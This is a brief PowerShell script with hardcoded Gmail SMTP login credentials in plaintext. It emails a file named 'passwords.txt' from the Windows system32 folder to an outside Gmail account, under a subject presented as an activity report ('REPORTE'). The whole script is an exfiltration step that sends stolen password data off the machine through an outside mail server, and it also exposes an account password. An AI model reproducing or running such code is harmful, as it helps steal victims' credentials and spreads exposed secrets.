$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('flinodynet@gmail.com', 'Dyn1m3c@2018.');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'flinodynet@gmail.com' 
$ReportEmail.To.Add('flinodynet@gmail.com')
$ReportEmail.Subject = 'REPORTE'
$ReportEmail.Body = 'Reporte de actividades'
$ReportEmail.Attachments.Add('c:\windows\system32\passwords.txt')
$SMTPInfo.Send($ReportEmail)
